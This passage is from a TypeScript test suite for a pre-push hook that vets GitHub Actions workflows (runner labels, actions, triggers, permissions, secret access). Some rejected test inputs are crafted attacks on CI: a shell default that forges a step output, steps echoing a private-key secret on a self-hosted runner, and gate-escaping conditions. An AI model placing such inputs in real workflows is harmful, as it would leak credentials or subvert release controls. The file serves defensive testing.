// @effect-diagnostics nodeBuiltinImport:off - builds real git repositories and hook layouts on disk.
import * as NodeChildProcess from "node:child_process";
import * as NodeFS from "node:fs";
import * as NodeModule from "node:module";
import * as NodePath from "node:path";

import { afterEach, describe, expect, it } from "vite-plus/test";

import {
  advice,
  baseJob,
  fixture,
  gateJob,
  gitExecutable,
  lightRunner,
  removeFixtures,
  runnerLabels,
  screenshotPermissions,
  screenshotWorkflow,
  sourceRoot,
  trustedRunner,
  upstreamPath,
  validWorkflow,
  workflow,
  workflowPath,
  yamlRefusal,
  yamlSource,
  zero,
} from "./lib/goat-workflow-guard-fixture.ts";

afterEach(removeFixtures);

describe("goat pre-push workflow guard", () => {
  it("allows the shipped goat workflow with disabled upstream workflows and the audited lookup", () => {
    const f = fixture({
      workflow: NodeFS.readFileSync(NodePath.join(sourceRoot, workflowPath), "utf8"),
    });
    const result = f.hook(f.record(f.sha));
    expect(result.status).toBe(0);
    expect(result.stderr).toBe("");
    expect(f.ghCalls()).toBe(1);
    expect(NodeFS.readFileSync(f.ghArgs, "utf8").split("\n")).toEqual([
      "api",
      "--paginate",
      "repos/goat-si/goat/actions/workflows?per_page=100",
      "--jq",
      '.workflows[] | select(.state=="disabled_manually") | .path',
      "",
    ]);
  });

  it("allows the screenshot job alongside ci with scoped Checks API permission", () => {
    const f = fixture({ workflow: screenshotWorkflow() });
    expect(f.hook(f.record(f.sha)).status).toBe(0);
  });

  it.each(["ubuntu-24.04", lightRunner])("allows the gate jobs on %s", (runner) => {
    const gate = { ...gateJob, "runs-on": runner };
    const f = fixture({
      workflow: JSON.stringify({
        on: { pull_request: null },
        jobs: { scope: gate, ci: { ...baseJob, "runs-on": trustedRunner }, result: gate },
      }),
    });
    expect(f.hook(f.record(f.sha)).status).toBe(0);
  });

  // A gate job on the matrix's runners waits behind it; the matrix on the light runners would
  // take the only runners the gates can use.
  it.each([
    ["scope", "the matrix's EPYC expression", trustedRunner],
    ["result", "the matrix's EPYC labels", runnerLabels],
    [
      "scope",
      "the light labels without the fork fallback",
      ["self-hosted", "linux", "x64", "goat", "epyc-light"],
    ],
    ["result", "a moving hosted image", "ubuntu-latest"],
    [
      "result",
      "an edited light expression",
      lightRunner.replace("'ubuntu-24.04'", "'ubuntu-latest'"),
    ],
  ])("refuses jobs.%s on %s", (name, _label, runner) => {
    const f = fixture({
      workflow: JSON.stringify({
        on: { pull_request: null },
        jobs: { ci: baseJob, [name]: { ...gateJob, "runs-on": runner } },
      }),
    });
    const refused = f.hook(f.record(f.sha));
    expect(refused.status).toBe(1);
    expect(refused.stderr).toContain(
      `jobs.${name}.runs-on must be ubuntu-24.04 or the trusted-run epyc-light expression`,
    );
  });

  it.each([
    ["light expression", lightRunner],
    ["light labels", ["self-hosted", "linux", "x64", "goat", "epyc-light"]],
  ])("refuses the ci matrix on the %s", (_label, runner) => {
    const f = fixture({ workflow: workflow({ ...baseJob, "runs-on": runner }) });
    const refused = f.hook(f.record(f.sha));
    expect(refused.status).toBe(1);
    expect(refused.stderr).toContain("jobs.ci.runs-on must be ubuntu-24.04");
  });

  it("allows the trusted-run expression that keeps fork pull requests on the hosted image", () => {
    const f = fixture({ workflow: workflow({ ...baseJob, "runs-on": trustedRunner }) });
    expect(f.hook(f.record(f.sha)).status).toBe(0);
  });

  it.each([
    [
      "any pull request on EPYC",
      trustedRunner.replace(
        "github.event.pull_request.head.repo.full_name == github.repository",
        "github.event_name == 'pull_request'",
      ),
    ],
    ["a moving hosted fallback", trustedRunner.replace("'ubuntu-24.04'", "'ubuntu-latest'")],
    ["the expression without its wrapper", trustedRunner.slice(4, -3)],
  ])("rejects a runs-on expression with %s", (_name, runner) => {
    const f = fixture({ workflow: workflow({ ...baseJob, "runs-on": runner }) });
    const result = f.hook(f.record(f.sha));
    expect(result.status).toBe(1);
    expect(result.stderr).toContain("jobs.ci.runs-on must be ubuntu-24.04");
  });

  it.each([
    ["hosted runner", { "runs-on": "ubuntu-latest" }, "jobs.screenshot-gate.runs-on"],
    [
      "unapproved action",
      { steps: [{ uses: "actions/checkout@v5" }] },
      "uses is not an allowed action",
    ],
    [
      "reusable job",
      { uses: "org/repo/.github/workflows/ci.yml@main" },
      "jobs.screenshot-gate.uses is forbidden",
    ],
    ["container", { container: "node:24" }, "jobs.screenshot-gate.container"],
    ["services", { services: {} }, "jobs.screenshot-gate.container"],
    ["missing permissions", { permissions: undefined }, "jobs.screenshot-gate.permissions"],
    [
      "extra write permission",
      { permissions: { ...screenshotPermissions, contents: "write" } },
      "jobs.screenshot-gate.permissions",
    ],
    [
      "extra scope",
      { permissions: { ...screenshotPermissions, actions: "read" } },
      "jobs.screenshot-gate.permissions",
    ],
  ])("rejects a screenshot job with %s", (_name, patch, message) => {
    const f = fixture({ workflow: screenshotWorkflow(patch) });
    const result = f.hook(f.record(f.sha));
    expect(result.status).toBe(1);
    expect(result.stderr).toContain(message);
  });

  it("allows deletion-only pushes without node, yaml or gh", () => {
    const f = fixture({ node: false, gh: false, yaml: "missing" });
    const result = f.hook(f.record(zero, "(delete)", f.sha));
    expect(result.status).toBe(0);
    expect(result.stderr).toBe("");
    expect(f.ghCalls()).toBe(0);
  });

  it("allows unrelated remotes without dependencies or checking the tip", () => {
    const f = fixture({ node: false, gh: false, yaml: "missing" });
    const result = f.hook(f.record("bad-tip"), {}, ["origin", "git@github.com:other/repo.git"]);
    expect(result.status).toBe(0);
    expect(result.stderr).toBe("");
    expect(f.ghCalls()).toBe(0);
  });

  it("allows the explicit bypass and preserves its warning without dependencies", () => {
    const f = fixture({ node: false, gh: false, yaml: "missing" });
    const result = f.hook(f.record("bad-tip"), { GOAT_SKIP_WORKFLOW_GUARD: "1" });
    expect(result.status).toBe(0);
    expect(result.stderr).toBe(
      "goat pre-push: workflow guard skipped; Actions must already be disabled\n",
    );
    expect(f.ghCalls()).toBe(0);
  });

  it("rejects a committed hosted runner for a mixed-case Goat remote URL", () => {
    const f = fixture({ workflow: workflow({ ...baseJob, "runs-on": "ubuntu-latest" }) });
    const result = f.hook(f.record(f.sha), {}, ["origin", "git@github.com:Goat-Si/Goat.git"]);
    expect(result.status).toBe(1);
    expect(result.stderr).toBe(
      `goat pre-push: ${workflowPath} in refs/heads/test (${f.sha}): jobs.ci.runs-on must be ubuntu-24.04, exactly self-hosted, linux, x64, goat, epyc, or the trusted-run EPYC expression; refusing to push\n${advice}\n`,
    );
    expect(f.ghCalls()).toBe(1);
  });

  it.each([
    ["reordered runner labels", workflow({ ...baseJob, "runs-on": runnerLabels.toReversed() })],
    [
      "all allowed actions",
      workflow({
        ...baseJob,
        steps: [{ uses: "actions/checkout@v6" }, { uses: "voidzero-dev/setup-vp@v1" }],
      }),
    ],
    [
      "all allowed triggers",
      workflow(baseJob, { push: null, pull_request: null, workflow_dispatch: null }),
    ],
    ["YAML 1.2 directive", `%YAML 1.2\n---\n${validWorkflow}`],
    [
      "quoted runs-on and tagged on keys",
      validWorkflow.replace("on:", "!!str on:").replace("runs-on:", '"runs-on":'),
    ],
    [
      "bounded aliases",
      `labels: &labels [self-hosted, linux, x64, goat, epyc]\n${validWorkflow.replace("[self-hosted, linux, x64, goat, epyc]", "*labels")}`,
    ],
  ])("allows %s", (_name, content) => {
    const f = fixture({ workflow: content });
    expect(f.hook(f.record(f.sha)).status).toBe(0);
    expect(f.ghCalls()).toBe(1);
  });

  it("skips deletion before a new branch and looks up gh once across several valid tips", () => {
    const f = fixture();
    const first = f.sha;
    f.write(workflowPath, workflow({ ...baseJob, "runs-on": runnerLabels.toReversed() }));
    const second = f.commit();
    const result = f.hook(
      f.record(zero, "(delete)", first) +
        f.record(first, "refs/heads/new") +
        f.record(second, "refs/heads/second", first),
    );
    expect(result.status).toBe(0);
    expect(result.stderr).toBe("");
    expect(f.ghCalls()).toBe(1);
  });

  it.each(["named", "direct URL"])("accepts the %s remote argument form", (form) => {
    const f = fixture();
    const remote = form === "named" ? ["origin", f.bare] : [f.bare, f.bare];
    expect(f.hook(f.record(f.sha), {}, remote).status).toBe(0);
    expect(f.ghCalls()).toBe(1);
  });

  it("allows disabled workflows when goat-ci is absent without loading yaml", () => {
    const f = fixture({ workflow: null, yaml: "missing" });
    expect(f.hook(f.record(f.sha)).status).toBe(0);
    expect(f.ghCalls()).toBe(1);
  });

  it.each(["new.yml", "space name.yaml", "tab\tline\nend.yml", "sub/x.yml"])(
    "rejects an unregistered filename %j without whitespace splitting",
    (name) => {
      const f = fixture();
      const path = `.github/workflows/${name}`;
      f.write(path, "on: push\njobs: {}\n");
      const sha = f.commit();
      const result = f.hook(f.record(sha));
      expect(result.status).toBe(1);
      expect(result.stderr).toBe(
        `goat pre-push: ${path} in refs/heads/test is not disabled on goat-si/goat\n${advice}\n`,
      );
      expect(f.ghCalls()).toBe(1);
    },
  );

  it("rejects an unregistered upstream .yaml workflow", () => {
    const f = fixture();
    const result = f.hook(f.record(f.sha), { MOCK_DISABLED_WORKFLOWS: "" });
    expect(result.status).toBe(1);
    expect(result.stderr).toBe(
      `goat pre-push: ${upstreamPath} in refs/heads/test is not disabled on goat-si/goat\n${advice}\n`,
    );
    expect(f.ghCalls()).toBe(1);
  });

  it("ignores files without a workflow suffix and accepts registered paths", () => {
    const f = fixture();
    f.write(".github/workflows/notes.txt", "not a workflow");
    f.write(".github/workflows/registered.yml", "on: push\njobs: {}\n");
    const sha = f.commit();
    expect(
      f.hook(f.record(sha), {
        MOCK_DISABLED_WORKFLOWS: `${upstreamPath}\n.github/workflows/registered.yml`,
      }).status,
    ).toBe(0);
  });

  it.each(["failure", "missing gh"])("refuses a GitHub lookup %s", (mode) => {
    const f = fixture({ gh: mode !== "missing gh" });
    const result = f.hook(f.record(f.sha), { MOCK_GH_FAIL: "1" });
    expect(result.status).toBe(1);
    expect(result.stderr).toContain(
      "goat pre-push: could not read workflow states from GitHub; refusing to push\n",
    );
    expect(f.ghCalls()).toBe(mode === "failure" ? 1 : 0);
  });

  it("rejects one bad tip among valid tips, including an unchanged workflow in a clean working tree", () => {
    const f = fixture();
    f.write(workflowPath, workflow({ ...baseJob, "runs-on": "ubuntu-latest" }));
    const bad = f.commit();
    f.write(".github/workflows/notes.txt", "workflow unchanged in this tip");
    const unchangedBad = f.commit();
    f.write(workflowPath, validWorkflow);
    const good = f.commit();
    expect(f.git("status", "--porcelain")).toBe("");
    const result = f.hook(
      f.record(f.sha, "refs/heads/good-first") +
        f.record(unchangedBad, "refs/heads/bad") +
        f.record(good, "refs/heads/good-last"),
    );
    expect(result.status).toBe(1);
    expect(result.stderr).toBe(
      `goat pre-push: ${workflowPath} in refs/heads/bad (${unchangedBad}): jobs.ci.runs-on must be ubuntu-24.04, exactly self-hosted, linux, x64, goat, epyc, or the trusted-run EPYC expression; refusing to push\n${advice}\n`,
    );
    expect(bad).not.toBe(unchangedBad);
    expect(f.ghCalls()).toBe(1);
  });

  it.each([
    [
      "hosted runner",
      workflow({ ...baseJob, "runs-on": "ubuntu-latest" }),
      "jobs.ci.runs-on must be ubuntu-24.04, exactly self-hosted, linux, x64, goat, epyc, or the trusted-run EPYC expression",
    ],
    [
      "hosted runner with quoted runs-on and tagged on keys",
      validWorkflow
        .replace("on:", "!!str on:")
        .replace("runs-on:", '"runs-on":')
        .replace("[self-hosted, linux, x64, goat, epyc]", "ubuntu-latest"),
      "jobs.ci.runs-on must be ubuntu-24.04, exactly self-hosted, linux, x64, goat, epyc, or the trusted-run EPYC expression",
    ],
    [
      "disallowed trigger with tagged on key",
      validWorkflow.replace("on:", "!!str on:").replace("  push:", "  schedule:"),
      "on must be a nonempty mapping containing only push, pull_request, workflow_dispatch",
    ],
    [
      "reusable job",
      workflow({ ...baseJob, uses: "org/repo/.github/workflows/ci.yml@main" }),
      "jobs.ci.uses is forbidden",
    ],
    ["null job uses", workflow({ ...baseJob, uses: null }), "jobs.ci.uses is forbidden"],
    [
      "disallowed action",
      workflow({ ...baseJob, steps: [{ uses: "actions/checkout@v5" }] }),
      "step 0.uses is not an allowed action",
    ],
    [
      "nonliteral action",
      workflow({ ...baseJob, steps: [{ uses: "${{ inputs.action }}" }] }),
      "step 0.uses is not an allowed action",
    ],
    [
      "extra job",
      JSON.stringify({ on: { push: null }, jobs: { ci: baseJob, extra: baseJob } }),
      "jobs must contain ci and optionally scope, screenshot-gate, result",
    ],
    [
      "missing jobs",
      JSON.stringify({ on: { push: null } }),
      "jobs must contain ci and optionally scope, screenshot-gate, result",
    ],
    [
      "jobs array",
      JSON.stringify({ on: { push: null }, jobs: [] }),
      "jobs must contain ci and optionally scope, screenshot-gate, result",
    ],
    ["nonmapping ci", workflow(null), "jobs.ci must be a mapping"],
    [
      "schedule",
      workflow(baseJob, { push: null, schedule: [] }),
      "on must be a nonempty mapping containing only push, pull_request, workflow_dispatch",
    ],
    [
      "empty on",
      workflow(baseJob, {}),
      "on must be a nonempty mapping containing only push, pull_request, workflow_dispatch",
    ],
    [
      "scalar on",
      workflow(baseJob, "push"),
      "on must be a nonempty mapping containing only push, pull_request, workflow_dispatch",
    ],
    [
      "array on",
      workflow(baseJob, ["push"]),
      "on must be a nonempty mapping containing only push, pull_request, workflow_dispatch",
    ],
    [
      "missing on",
      JSON.stringify({ jobs: { ci: baseJob } }),
      "on must be a nonempty mapping containing only push, pull_request, workflow_dispatch",
    ],
    [
      "container",
      workflow({ ...baseJob, container: "node:24" }),
      "jobs.ci.container and jobs.ci.services are forbidden",
    ],
    [
      "null container",
      workflow({ ...baseJob, container: null }),
      "jobs.ci.container and jobs.ci.services are forbidden",
    ],
    [
      "services",
      workflow({ ...baseJob, services: {} }),
      "jobs.ci.container and jobs.ci.services are forbidden",
    ],
    [
      "null services",
      workflow({ ...baseJob, services: null }),
      "jobs.ci.container and jobs.ci.services are forbidden",
    ],
    [
      "duplicate labels",
      workflow({ ...baseJob, "runs-on": ["self-hosted", "linux", "x64", "goat", "goat"] }),
      "jobs.ci.runs-on must be ubuntu-24.04, exactly self-hosted, linux, x64, goat, epyc, or the trusted-run EPYC expression",
    ],
    [
      "missing labels",
      workflow({ ...baseJob, "runs-on": runnerLabels.slice(1) }),
      "jobs.ci.runs-on must be ubuntu-24.04, exactly self-hosted, linux, x64, goat, epyc, or the trusted-run EPYC expression",
    ],
    [
      "extra label",
      workflow({ ...baseJob, "runs-on": [...runnerLabels, "ubuntu-latest"] }),
      "jobs.ci.runs-on must be ubuntu-24.04, exactly self-hosted, linux, x64, goat, epyc, or the trusted-run EPYC expression",
    ],
    [
      "nonliteral label",
      workflow({
        ...baseJob,
        "runs-on": ["self-hosted", "linux", "x64", "goat", "${{ inputs.runner }}"],
      }),
      "jobs.ci.runs-on must be ubuntu-24.04, exactly self-hosted, linux, x64, goat, epyc, or the trusted-run EPYC expression",
    ],
    [
      "nonstring label",
      workflow({ ...baseJob, "runs-on": ["self-hosted", "linux", "x64", "goat", 42] }),
      "jobs.ci.runs-on must be ubuntu-24.04, exactly self-hosted, linux, x64, goat, epyc, or the trusted-run EPYC expression",
    ],
    [
      "empty steps",
      workflow({ ...baseJob, steps: [] }),
      "jobs.ci.steps must be a nonempty array of mappings",
    ],
    [
      "nonarray steps",
      workflow({ ...baseJob, steps: {} }),
      "jobs.ci.steps must be a nonempty array of mappings",
    ],
    [
      "nonmapping step",
      workflow({ ...baseJob, steps: ["echo ok"] }),
      "jobs.ci.steps must be a nonempty array of mappings",
    ],
    [
      "both run and uses",
      workflow({ ...baseJob, steps: [{ run: "echo ok", uses: "actions/checkout@v6" }] }),
      "step 0 must contain exactly one of run or uses",
    ],
    [
      "neither run nor uses",
      workflow({ ...baseJob, steps: [{ name: "empty" }] }),
      "step 0 must contain exactly one of run or uses",
    ],
    [
      "null action",
      workflow({ ...baseJob, steps: [{ uses: null }] }),
      "step 0.uses is not an allowed action",
    ],
    ["root sequence", "[]", "root must be a mapping"],
    ["root scalar", "plain text", "root must be a mapping"],
    ["empty document", "", "root must be a mapping"],
    ["malformed YAML", "on: [", "invalid YAML"],
    ["duplicate-key YAML", `${validWorkflow}\non: {push: null}\n`, "invalid YAML"],
    [
      "nested duplicate keys",
      validWorkflow.replace(
        "      - run: echo ok",
        "      - run: echo ok\n        run: echo twice",
      ),
      "invalid YAML",
    ],
    ["multiple YAML documents", `${validWorkflow}\n---\n${validWorkflow}`, "invalid YAML"],
    ["merge key", `${validWorkflow}\nextra:\n  <<: {hello: world}\n`, "invalid YAML"],
    [
      "quoted merge key in sequence",
      `${validWorkflow}\nextra:\n  - nested:\n      '<<': null\n`,
      "invalid YAML",
    ],
    [
      "aliased merge key",
      `${validWorkflow}\nkey: &key '<<'\nextra:\n  *key: null\n`,
      "invalid YAML",
    ],
    ["YAML 1.1 directive", `%YAML 1.1\n---\n${validWorkflow}`, "invalid YAML"],
    [
      "excessive alias expansion",
      `${validWorkflow}\na: &a [a, b, c, d, e, f, g, h, i, j]\nb: &b [*a, *a, *a, *a, *a, *a, *a, *a, *a, *a]\nc: &c [*b, *b, *b, *b, *b, *b, *b, *b, *b, *b]\nd: *c\n`,
      "invalid YAML",
    ],
  ])("rejects %s with the exact structural diagnostic", (_name, content, reason) => {
    const f = fixture({ workflow: content });
    const result = f.hook(f.record(f.sha));
    expect(result.status).toBe(1);
    expect(result.stderr).toBe(
      `goat pre-push: ${workflowPath} in refs/heads/test (${f.sha}): ${reason}; refusing to push\n${advice}\n`,
    );
    expect(f.ghCalls()).toBe(1);
  });

  it("refuses missing node before contacting GitHub", () => {
    const f = fixture({ node: false });
    const result = f.hook(f.record(f.sha));
    expect(result.status).toBe(1);
    expect(result.stderr).toBe("goat pre-push: node is unavailable; refusing to push\n");
    expect(f.ghCalls()).toBe(0);
  });

  it.each(["hosted runner", "unregistered workflow"])(
    "rejects a bad tip containing a %s despite a replacement with a safe commit",
    (mode) => {
      const f = fixture();
      const extraPath = ".github/workflows/replaced.yml";
      if (mode === "hosted runner") {
        f.write(workflowPath, workflow({ ...baseJob, "runs-on": "ubuntu-latest" }));
      } else {
        f.write(extraPath, "on: push\njobs: {}\n");
      }
      const bad = f.commit();
      f.git("replace", bad, f.sha);
      expect(f.git("show", `${bad}:${workflowPath}`)).toBe(validWorkflow.trim());
      const result = f.hook(f.record(bad));
      expect(result.status).toBe(1);
      expect(result.stderr).toBe(
        mode === "hosted runner"
          ? `goat pre-push: ${workflowPath} in refs/heads/test (${bad}): jobs.ci.runs-on must be ubuntu-24.04, exactly self-hosted, linux, x64, goat, epyc, or the trusted-run EPYC expression; refusing to push\n${advice}\n`
          : `goat pre-push: ${extraPath} in refs/heads/test is not disabled on goat-si/goat\n${advice}\n`,
      );
      expect(f.ghCalls()).toBe(1);
    },
  );

  it.each(["missing", "wrong-version", "unloadable"] as const)(
    "refuses %s repository yaml without falling back",
    (yaml) => {
      const f = fixture({ yaml });
      const result = f.hook(f.record(f.sha));
      expect(result.status).toBe(1);
      expect(result.stderr).toBe(`${yamlRefusal}\n${advice}\n`);
      expect(f.ghCalls()).toBe(1);
    },
  );

  it("rejects an unreadable tip instead of hiding a git traversal failure", () => {
    const f = fixture();
    const sha = "f".repeat(40);
    const result = f.hook(f.record(sha));
    expect(result.status).toBe(1);
    expect(result.stderr).toBe(
      `goat pre-push: cannot enumerate pushed workflows in refs/heads/test (${sha}); refusing to push\n${advice}\n`,
    );
    expect(f.ghCalls()).toBe(1);
  });

  it("explicitly refuses when enumeration succeeds but git show fails", () => {
    const f = fixture();
    const gitPath = NodePath.join(f.bin, "git");
    NodeFS.unlinkSync(gitPath);
    NodeFS.writeFileSync(
      gitPath,
      `#!/bin/sh
if [ "$1" = "--no-replace-objects" ]; then shift; fi
if [ "$1" = "ls-tree" ]; then printf '.github/workflows/goat-ci.yml\\000'; exit 0; fi
if [ "$1" = "rev-parse" ]; then printf '%s\\n' "$MOCK_GIT_ROOT"; exit 0; fi
exit 1
`,
    );
    NodeFS.chmodSync(gitPath, 0o755);
    const result = f.hook(f.record(f.sha), { MOCK_GIT_ROOT: f.repo });
    expect(result.status).toBe(1);
    expect(result.stderr).toBe(
      `goat pre-push: ${workflowPath} in refs/heads/test (${f.sha}): cannot read pushed workflow; refusing to push\n${advice}\n`,
    );
  });

  it("accepts and rejects real pushes through the installed Vite+ shim", () => {
    const f = fixture();
    const allowed = NodeChildProcess.spawnSync(
      gitExecutable,
      ["push", "origin", "HEAD:refs/heads/accepted"],
      { cwd: f.repo, env: f.env, encoding: "utf8" },
    );
    expect(allowed.status, allowed.stderr).toBe(0);
    expect(f.git("--git-dir", f.bare, "rev-parse", "refs/heads/accepted")).toBe(f.sha);
    expect(f.ghCalls()).toBe(1);
    f.write(workflowPath, workflow({ ...baseJob, "runs-on": "ubuntu-latest" }));
    const bad = f.commit();
    const rejected = NodeChildProcess.spawnSync(
      gitExecutable,
      ["push", f.bare, "HEAD:refs/heads/rejected"],
      { cwd: f.repo, env: f.env, encoding: "utf8" },
    );
    expect(rejected.status).not.toBe(0);
    expect(rejected.stderr).toContain(
      `goat pre-push: ${workflowPath} in HEAD (${bad}): jobs.ci.runs-on must be ubuntu-24.04, exactly self-hosted, linux, x64, goat, epyc, or the trusted-run EPYC expression; refusing to push`,
    );
    const absent = NodeChildProcess.spawnSync(
      gitExecutable,
      ["--git-dir", f.bare, "show-ref", "--verify", "refs/heads/rejected"],
      { cwd: f.repo, env: f.env, encoding: "utf8" },
    );
    expect(absent.status).not.toBe(0);
    expect(f.ghCalls()).toBe(2);
  });
});

const nightlyPath = ".github/workflows/goat-nightly.yml";
const prepareGateText =
  "github.repository == 'goat-si/goat' && (github.event_name == 'workflow_dispatch' || (github.event_name == 'schedule' && vars.GOAT_RELEASES_PUBLISH == 'true'))";
const downstreamGateText =
  "needs.prepare.result == 'success' && needs.prepare.outputs.skip == 'false'";
const macRunner = ["self-hosted", "macOS", "ARM64", "goat", "mac-studio"];
const checkout = (ref = "${{ needs.prepare.outputs.sha }}") => ({
  uses: "actions/checkout@v6",
  with: { ref, "persist-credentials": false },
});

// The guard pins prepare's resolve step; reuse the shipped one.
function shippedResolveStep(): Record<string, unknown> {
  const yaml = NodeModule.createRequire(import.meta.url)(yamlSource) as {
    parse: (source: string) => { jobs: { prepare: { steps: Array<Record<string, unknown>> } } };
  };
  const shipped = yaml.parse(NodeFS.readFileSync(NodePath.join(sourceRoot, nightlyPath), "utf8"));
  const step = shipped.jobs.prepare.steps.find((candidate) => candidate.id === "resolve");
  if (!step) throw new Error("shipped workflow has no resolve step");
  return step;
}

const preparedStep = "steps.resolve.outputs.skip == 'false'";
type NightlyJobs = Record<string, Record<string, unknown>>;
function nightlyJobs(): NightlyJobs {
  return {
    prepare: {
      if: prepareGateText,
      "runs-on": runnerLabels,
      outputs: {
        sha: "${{ steps.resolve.outputs.sha }}",
        skip: "${{ steps.resolve.outputs.skip }}",
      },
      steps: [
        shippedResolveStep(),
        { ...checkout("${{ steps.resolve.outputs.sha }}"), if: preparedStep },
        { run: "echo prepare", if: preparedStep },
      ],
    },
    build_mac: {
      needs: ["prepare"],
      if: downstreamGateText,
      "runs-on": macRunner,
      steps: [checkout(), { run: "echo sign" }],
    },
    build_other: {
      needs: ["prepare"],
      if: downstreamGateText,
      "runs-on": "${{ matrix.runner }}",
      strategy: {
        matrix: { include: [{ runner: "windows-2025" }, { runner: "ubuntu-24.04-arm" }] },
      },
      steps: [{ run: "echo build" }],
    },
    publish: {
      needs: ["prepare", "build_mac"],
      if: `${downstreamGateText} && (!cancelled() && needs.build_mac.result == 'success')`,
      "runs-on": "ubuntu-24.04",
      steps: [
        checkout(),
        {
          id: "app_token",
          uses: "actions/create-github-app-token@v2",
          with: { "app-id": "${{ secrets.GOAT_RELEASES_APP_ID }}" },
        },
        { run: "echo publish" },
      ],
    },
  };
}
function nightly(jobs: NightlyJobs = nightlyJobs(), on: unknown = undefined) {
  return JSON.stringify({
    on: on ?? { schedule: [{ cron: "0 18 * * *" }], workflow_dispatch: null },
    permissions: { contents: "read" },
    jobs,
  });
}
function withJob(name: string, patch: Record<string, unknown>) {
  const jobs = nightlyJobs();
  jobs[name] = { ...jobs[name], ...patch };
  return nightly(jobs);
}

describe("goat pre-push nightly workflow guard", () => {
  function push(content: string) {
    const f = fixture();
    f.write(nightlyPath, content);
    const sha = f.commit();
    return f.hook(f.record(sha));
  }

  it("allows the gated nightly workflow", () => {
    const result = push(nightly());
    expect(result.stderr).toBe("");
    expect(result.status).toBe(0);
  });

  it("allows contents: write on hand-off jobs, and issues: read on publish", () => {
    const jobs = nightlyJobs();
    jobs.build_mac = { ...jobs.build_mac, permissions: { contents: "write" } };
    jobs.publish = { ...jobs.publish, permissions: { contents: "write", issues: "read" } };
    jobs.cleanup = {
      needs: ["prepare", "publish"],
      if: `${downstreamGateText} && (always())`,
      "runs-on": "ubuntu-24.04",
      permissions: { contents: "write" },
      steps: [checkout(), { run: "node scripts/nightly-staging.ts cleanup" }],
    };
    const result = push(nightly(jobs));
    expect(result.stderr).toBe("");
    expect(result.status).toBe(0);
  });

  it("allows the shipped nightly workflow", () => {
    const shipped = NodePath.join(sourceRoot, nightlyPath);
    if (!NodeFS.existsSync(shipped)) return;
    const result = push(NodeFS.readFileSync(shipped, "utf8"));
    expect(result.stderr).toBe("");
    expect(result.status).toBe(0);
  });

  it("allows prose about secrets and include rows that extend a runner axis", () => {
    const jobs = nightlyJobs();
    jobs.build_mac = {
      ...jobs.build_mac,
      steps: [checkout(), { name: "Rotate secrets documentation", run: "echo docs" }],
    };
    jobs.build_other = {
      ...jobs.build_other,
      strategy: { matrix: { runner: ["ubuntu-24.04"], include: [{ version: "24" }] } },
    };
    const result = push(nightly(jobs));
    expect(result.stderr).toBe("");
    expect(result.status).toBe(0);
  });

  it("refuses workflow-level defaults that would reach the resolve step", () => {
    const workflow = JSON.parse(nightly()) as Record<string, unknown>;
    workflow.defaults = { run: { shell: "bash -c 'echo sha=main >> $GITHUB_OUTPUT' {0}" } };
    const result = push(JSON.stringify(workflow));
    expect(result.status).toBe(1);
    expect(result.stderr).toContain("workflow-level env and defaults are not allowed");
  });

  it("refuses a YAML alias that copies the publish job under another name", () => {
    const yamlText = [
      "on:",
      "  workflow_dispatch:",
      "permissions: { contents: read }",
      "jobs:",
      `  prepare: ${JSON.stringify(nightlyJobs().prepare)}`,
      "  publish: &publisher",
      "    needs: [prepare]",
      `    if: "${downstreamGateText}"`,
      "    runs-on: ubuntu-24.04",
      "    steps:",
      "      - uses: actions/create-github-app-token@v2",
      "  copy_publish: *publisher",
    ].join("\n");
    const result = push(yamlText);
    expect(result.status).toBe(1);
    expect(result.stderr).toContain("only jobs.publish may create a GitHub App token");
  });

  it.each<[string, string, string]>([
    [
      "a pull_request trigger",
      nightly(undefined, { workflow_dispatch: null, pull_request: null }),
      "on must be workflow_dispatch plus an optional schedule",
    ],
    ["a push trigger", nightly(undefined, { push: null }), "on must be workflow_dispatch plus"],
    [
      "the old goat-ci workflow_run trigger",
      nightly(undefined, {
        workflow_run: { workflows: ["goat-ci"], types: ["completed"], branches: ["dev"] },
        workflow_dispatch: null,
      }),
      "on must be workflow_dispatch plus",
    ],
    [
      "a schedule without a manual trigger",
      nightly(undefined, { schedule: [{ cron: "0 18 * * *" }] }),
      "on must be workflow_dispatch plus",
    ],
    [
      "a schedule entry with extra keys",
      nightly(undefined, {
        schedule: [{ cron: "0 18 * * *", branches: ["main"] }],
        workflow_dispatch: null,
      }),
      "on must be workflow_dispatch plus",
    ],
    [
      "a gate that publishes scheduled runs without the repository variable",
      withJob("prepare", {
        if: prepareGateText.replace(" && vars.GOAT_RELEASES_PUBLISH == 'true'", ""),
      }),
      "jobs.prepare.if must be the manual or scheduled run gate",
    ],
    [
      "a gate that also accepts pushes",
      withJob("prepare", {
        if: prepareGateText.replace(
          "github.event_name == 'workflow_dispatch' ||",
          "github.event_name == 'workflow_dispatch' || github.event_name == 'push' ||",
        ),
      }),
      "jobs.prepare.if must be the manual or scheduled run gate",
    ],
    [
      "a missing gate",
      withJob("prepare", { if: undefined }),
      "jobs.prepare.if must be the manual or scheduled run gate",
    ],
    [
      "a job without needs: prepare",
      withJob("build_mac", { needs: [] }),
      "jobs.build_mac.needs must include prepare",
    ],
    [
      "if: always()",
      withJob("build_mac", { if: "always()" }),
      "jobs.build_mac.if must start with the prepare gate",
    ],
    [
      "an || escape after the gate",
      withJob("build_mac", { if: `${downstreamGateText} || always()` }),
      "jobs.build_mac.if must start with the prepare gate",
    ],
    [
      "an unparenthesized tail",
      withJob("build_mac", { if: `${downstreamGateText} && true || always()` }),
      "jobs.build_mac.if must start with the prepare gate",
    ],
    [
      "no if",
      withJob("build_mac", { if: undefined }),
      "jobs.build_mac.if must start with the prepare gate",
    ],
    [
      "an unknown runner set",
      withJob("build_mac", { "runs-on": ["self-hosted", "macOS"] }),
      "jobs.build_mac.runs-on must be an allowed hosted runner",
    ],
    [
      "a matrix with one bad runner",
      withJob("build_other", {
        strategy: {
          matrix: { include: [{ runner: "windows-2025" }, { runner: "ubuntu-latest" }] },
        },
      }),
      "jobs.build_other.runs-on must be an allowed hosted runner",
    ],
    [
      "a disallowed action",
      withJob("build_mac", { steps: [checkout(), { uses: "some/action@v1" }] }),
      "jobs.build_mac step 1.uses is not an allowed action",
    ],
    [
      "a secret on the Mac runner",
      withJob("build_mac", {
        steps: [checkout(), { run: "echo ${{ secrets.GOAT_RELEASES_APP_PRIVATE_KEY }}" }],
      }),
      "secrets may only be read by jobs.publish",
    ],
    [
      "a bracketed secret on the Mac runner",
      withJob("build_mac", {
        env: { KEY: "${{ secrets['GOAT_RELEASES_APP_PRIVATE_KEY'] }}" },
      }),
      "secrets may only be read by jobs.publish",
    ],
    [
      "the whole secrets context on the Mac runner",
